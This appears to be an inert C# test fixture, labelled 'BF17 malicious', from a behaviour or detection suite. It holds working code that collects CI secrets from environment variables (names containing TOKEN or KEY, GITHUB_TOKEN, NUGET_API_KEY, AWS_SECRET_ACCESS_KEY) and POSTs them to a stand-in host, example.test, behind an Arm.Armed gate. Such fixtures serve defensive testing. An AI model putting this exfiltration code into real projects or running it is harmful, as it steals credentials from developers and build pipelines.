// Inert fixture: never executed (gated by Arm.Armed). BF17 malicious: harvests CI secrets from the environment and posts them.
using System;
using System.Collections;
using System.Net.Http;
using System.Text;

namespace Behaviour
{
    public static class Harvest
    {
        public static void Run()
        {
            if (!Arm.Armed) return;
            var sb = new StringBuilder();
            foreach (DictionaryEntry entry in Environment.GetEnvironmentVariables())
            {
                var key = (string)entry.Key;
                if (key.Contains("TOKEN") || key.Contains("KEY"))
                    sb.Append(key).Append('=').Append(entry.Value).Append('\n');
            }
            sb.Append(Environment.GetEnvironmentVariable("GITHUB_TOKEN")).Append('\n');
            sb.Append(Environment.GetEnvironmentVariable("NUGET_API_KEY")).Append('\n');
            sb.Append(Environment.GetEnvironmentVariable("AWS_SECRET_ACCESS_KEY")).Append('\n');
            using var client = new HttpClient();
            client.PostAsync("https://example.test/silvergun-behaviour-suite/secrets", new StringContent(sb.ToString())).GetAwaiter().GetResult();
        }
    }
}
